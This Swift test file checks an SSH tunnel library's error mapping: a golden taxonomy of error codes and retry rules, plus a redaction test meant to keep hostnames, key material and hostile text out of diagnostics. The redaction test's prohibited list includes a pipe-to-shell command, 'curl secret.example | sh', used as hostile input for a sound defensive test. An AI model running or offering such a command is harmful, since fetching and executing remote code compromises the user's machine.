import Darwin
import Foundation
import ReluxTunnelCore
import Testing

@testable import ReluxTunnelCore

@Suite("SSH bootstrap privacy-safe error mapping")
struct SSHBootstrapErrorMappingTests {
  @Test("stage code action and retry taxonomy is a stable golden contract")
  func taxonomyGolden() throws {
    let context = SSHBootstrapDiagnosticContext(
      endpointFamily: .ipv6,
      algorithm: .sshEd25519
    )
    let selectedEngineNegotiation = try transportError(
      code: .algorithmNegotiationFailed,
      phase: .initialKeyExchange
    )
    let selectedEngineAuthentication = try transportError(
      code: .authenticationRejected,
      phase: .authentication
    )
    let cases: [SSHBootstrapProviderError] = [
      SSHBootstrapErrorMapper.profile(.profileCorrupt, configurationGeneration: 0),
      SSHBootstrapErrorMapper.transport(
        posixCode: ENETUNREACH,
        stage: .physicalPathResolution,
        configurationGeneration: 41,
        context: context
      ),
      SSHBootstrapErrorMapper.transport(
        posixCode: ETIMEDOUT,
        stage: .endpointConnect,
        configurationGeneration: 41,
        context: context
      ),
      SSHBootstrapErrorMapper.transport(
        posixCode: ECONNREFUSED,
        stage: .endpointConnect,
        configurationGeneration: 41,
        context: context
      ),
      SSHBootstrapErrorMapper.transport(
        selectedEngineNegotiation,
        configurationGeneration: 41,
        context: context
      ),
      SSHBootstrapErrorMapper.host(
        .changed,
        configurationGeneration: 41,
        context: context
      ),
      SSHBootstrapErrorMapper.credential(.accessDenied, configurationGeneration: 41),
      SSHBootstrapErrorMapper.transport(
        selectedEngineAuthentication,
        configurationGeneration: 41,
        context: context
      ),
      SSHBootstrapErrorMapper.cancellation(.taskCancelled, configurationGeneration: 41),
      SSHBootstrapErrorMapper.cancellation(.userStopped, configurationGeneration: 41),
      SSHBootstrapErrorMapper.sessionClose(.timedOut, configurationGeneration: 41),
    ]

    let golden = cases.map { error in
      let value = error.diagnostic
      return [
        value.domain.rawValue,
        String(error.errorCode),
        value.code.rawValue,
        value.stage.rawValue,
        value.userAction.rawValue,
        value.retryDisposition.rawValue,
        value.context.endpointFamily?.rawValue ?? "-",
        value.context.algorithm?.rawValue ?? "-",
      ].joined(separator: "|")
    }.joined(separator: "\n")

    #expect(
      golden
        == """
        sshProfileBootstrap|1002|profileCorrupt|profileLoad|reviewProfile|terminal|-|-
        sshProfileBootstrap|2001|pathUnavailable|physicalPathResolution|checkNetwork|retryableLater|ipv6|ssh-ed25519
        sshProfileBootstrap|8003|operationTimedOut|endpointConnect|retryLater|retryableLater|ipv6|ssh-ed25519
        sshProfileBootstrap|3001|endpointConnectFailed|endpointConnect|reviewProfile|terminal|ipv6|ssh-ed25519
        sshProfileBootstrap|4001|negotiationFailed|algorithmNegotiation|reviewProfile|terminal|ipv6|ssh-ed25519
        sshProfileBootstrap|5002|hostKeyChanged|hostVerification|replaceHostTrust|terminal|ipv6|ssh-ed25519
        sshProfileBootstrap|6002|credentialAccessDenied|credentialAccess|reviewCredential|terminal|-|-
        sshProfileBootstrap|7001|authenticationRejected|publicKeyAuthentication|reviewCredential|terminal|ipv6|ssh-ed25519
        sshProfileBootstrap|8001|operationCancelled|cancellation|none|cancelled|-|-
        sshProfileBootstrap|8002|userStopped|cancellation|none|cancelled|-|-
        sshProfileBootstrap|8003|operationTimedOut|sessionClose|retryLater|retryableLater|-|-
        """
    )
  }

  @Test("all bootstrap stages have an explicit public projection")
  func stageCoverage() {
    let projections = [
      SSHBootstrapErrorMapper.profile(.profileOversize),
      SSHBootstrapErrorMapper.transport(
        .unavailable,
        stage: .physicalPathResolution,
        configurationGeneration: 1
      ),
      SSHBootstrapErrorMapper.transport(
        .connectionRefused,
        stage: .endpointConnect,
        configurationGeneration: 1
      ),
      SSHBootstrapErrorMapper.transport(
        .unexpected,
        stage: .algorithmNegotiation,
        configurationGeneration: 1
      ),
      SSHBootstrapErrorMapper.host(.policyRejected, configurationGeneration: 1),
      SSHBootstrapErrorMapper.credential(.notProvisioned, configurationGeneration: 1),
      SSHBootstrapErrorMapper.authentication(.rejected, configurationGeneration: 1),
      SSHBootstrapErrorMapper.cancellation(.taskCancelled, configurationGeneration: 1),
      SSHBootstrapErrorMapper.sessionClose(.transportFailure, configurationGeneration: 1),
    ]
    #expect(projections.map(\.diagnostic.stage) == SSHBootstrapStage.allCases)
  }

  @Test("configuration trust credential and authentication gates remain terminal")
  func gatedFailuresAreTerminal() {
    let errors = [
      SSHBootstrapErrorMapper.profile(.profileCorrupt),
      SSHBootstrapErrorMapper.host(.changed, configurationGeneration: 1),
      SSHBootstrapErrorMapper.host(.algorithmUnsupported, configurationGeneration: 1),
      SSHBootstrapErrorMapper.host(.revoked, configurationGeneration: 1),
      SSHBootstrapErrorMapper.host(.policyRejected, configurationGeneration: 1),
      SSHBootstrapErrorMapper.credential(.accessDenied, configurationGeneration: 1),
      SSHBootstrapErrorMapper.authentication(.rejected, configurationGeneration: 1),
    ]
    #expect(errors.allSatisfy { $0.diagnostic.retryDisposition == .terminal })
    #expect(errors.allSatisfy { !$0.diagnostic.retryDisposition.isRetryable })
  }

  @Test("only bounded timeout and selected transient transport classes are retryable later")
  func transientClassification() {
    let retryable = [
      SSHBootstrapErrorMapper.transport(
        .timedOut,
        stage: .endpointConnect,
        configurationGeneration: 1
      ),
      SSHBootstrapErrorMapper.transport(
        .unavailable,
        stage: .physicalPathResolution,
        configurationGeneration: 1
      ),
      SSHBootstrapErrorMapper.transport(
        .connectionReset,
        stage: .endpointConnect,
        configurationGeneration: 1
      ),
    ]
    let terminal = SSHBootstrapErrorMapper.transport(
      .connectionRefused,
      stage: .endpointConnect,
      configurationGeneration: 1
    )

    #expect(retryable.allSatisfy { $0.diagnostic.retryDisposition == .retryableLater })
    #expect(terminal.diagnostic.retryDisposition == .terminal)
  }

  @Test("typed internal cause is preserved while public projection stays finite")
  func typedInternalCause() {
    let mapped = SSHBootstrapErrorMapper.map(
      .credential(.generationMismatch),
      configurationGeneration: 9
    )
    #expect(mapped.cause == .credential(.generationMismatch))
    #expect(mapped.providerError.diagnostic.code == .credentialGenerationMismatch)
    #expect(mapped.providerError.diagnostic.configurationGeneration == 9)
  }

  @Test("cancellation and explicit user stop never receive trust or authentication labels")
  func cancellationDistinction() {
    let cancellation = SSHBootstrapErrorMapper.cancellation(
      .taskCancelled,
      configurationGeneration: 3
    )
    let userStop = SSHBootstrapErrorMapper.cancellation(.userStopped, configurationGeneration: 3)

    #expect(cancellation.diagnostic.code == .operationCancelled)
    #expect(userStop.diagnostic.code == .userStopped)
    #expect(cancellation.diagnostic.stage == .cancellation)
    #expect(userStop.diagnostic.stage == .cancellation)
    #expect(cancellation.diagnostic.retryDisposition == .cancelled)
    #expect(userStop.diagnostic.retryDisposition == .cancelled)
  }

  @Test("authentication timeout and transport loss remain operational failures")
  func authenticationOperationalFailures() throws {
    let timeout = SSHBootstrapErrorMapper.transport(
      try transportError(code: .timedOut, phase: .authentication),
      configurationGeneration: 3
    )
    let lost = SSHBootstrapErrorMapper.transport(
      try transportError(code: .connectionLost, phase: .authentication),
      configurationGeneration: 3
    )

    #expect(timeout.diagnostic.code == .operationTimedOut)
    #expect(timeout.diagnostic.stage == .publicKeyAuthentication)
    #expect(timeout.diagnostic.retryDisposition == .retryableLater)
    #expect(lost.diagnostic.code == .transportInterrupted)
    #expect(lost.diagnostic.stage == .publicKeyAuthentication)
    #expect(lost.diagnostic.retryDisposition == .retryableLater)
  }

  @Test("hostile underlying errors and prohibited values are never projected")
  func hostileTextAndProhibitedDataRedaction() throws {
    let prohibited = [
      "ssh.example.invalid",
      "203.0.113.44",
      "sensitive-user",
      "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
      "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",
      "SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
      "/Library/Keychains/System.keychain",
      "PRIVATE-KEY-MATERIAL",
      "SSH-2.0-hostile-banner",
      "curl secret.example | sh",
    ]
    let hostileText = prohibited.joined(separator: " :: ")
    let hostile = NSError(
      domain: "hostile.engine.\(hostileText)",
      code: 31337,
      userInfo: [
        NSLocalizedDescriptionKey: hostileText,
        NSUnderlyingErrorKey: NSError(
          domain: hostileText,
          code: 1,
          userInfo: [NSLocalizedDescriptionKey: hostileText]
        ),
      ]
    )
    let error = SSHBootstrapErrorMapper.transport(
      hostile,
      stage: .endpointConnect,
      configurationGeneration: 17,
      context: SSHBootstrapDiagnosticContext(
        endpointFamily: .ipv4,
        algorithm: SSHBootstrapAlgorithmContext(hostKeyAlgorithm: hostileText)
      )
    )
    let bridged = error as NSError
    let encoded = try JSONEncoder().encode(error.diagnostic)
    let surfaces = [
      error.description,
      error.debugDescription,
      String(reflecting: error),
      String(data: encoded, encoding: .utf8)!,
      bridged.domain,
      String(describing: bridged.userInfo),
    ].joined(separator: "\n")

    #expect(error.diagnostic.code == .endpointConnectFailed)
    #expect(error.diagnostic.context.algorithm == .unsupported)
    #expect(bridged.domain == SSHBootstrapProviderError.errorDomain)
    #expect(bridged.userInfo[NSUnderlyingErrorKey] == nil)
    for value in prohibited {
      #expect(!surfaces.contains(value))
    }
  }

  @Test("socket and URL errors map by numeric class without descriptions")
  func socketAndURLErrorMapping() {
    let socket = NSError(
      domain: NSPOSIXErrorDomain,
      code: Int(ECONNRESET),
      userInfo: [NSLocalizedDescriptionKey: "server banner and address"]
    )
    let url = NSError(
      domain: NSURLErrorDomain,
      code: NSURLErrorTimedOut,
      userInfo: [NSLocalizedDescriptionKey: "ssh.example.invalid"]
    )

    #expect(
      SSHBootstrapErrorMapper.transport(
        socket,
        stage: .endpointConnect,
        configurationGeneration: 1
      ).diagnostic.retryDisposition == .retryableLater
    )
    #expect(
      SSHBootstrapErrorMapper.transport(
        url,
        stage: .endpointConnect,
        configurationGeneration: 1
      ).diagnostic.code == .operationTimedOut
    )
  }

  @Test("runtime diagnostics snapshot stores and clears only the bounded projection")
  func snapshotIntegration() throws {
    let store = RuntimeDiagnosticsStore(runtimeGeneration: 7)
    let recorder = store.recorder()
    let error = SSHBootstrapErrorMapper.host(
      .algorithmUnsupported,
      configurationGeneration: 23,
      context: SSHBootstrapDiagnosticContext(
        endpointFamily: .ipv6,
        algorithm: .unsupported
      )
    )
    recorder.recordSSHBootstrapError(error)

    let snapshot = try store.snapshot()
    #expect(snapshot.sshBootstrapError == error.diagnostic)
    let encoded = try RuntimeMessageCodec.encode(snapshot)
    #expect(try RuntimeMessageCodec.decodeDiagnosticsSnapshot(encoded) == snapshot)

    recorder.clearSSHBootstrapError()
    #expect(try store.snapshot().sshBootstrapError == nil)
  }

  private func transportError(
    code: SSHTransportErrorCode,
    phase: SSHTransportPhase
  ) throws -> SSHTransportError {
    try SSHTransportError(
      code: code,
      phase: phase,
      scope: .operation,
      retryDisposition: .never,
      requiresTeardown: true,
      channelOpenReason: .notApplicable
    )
  }
}
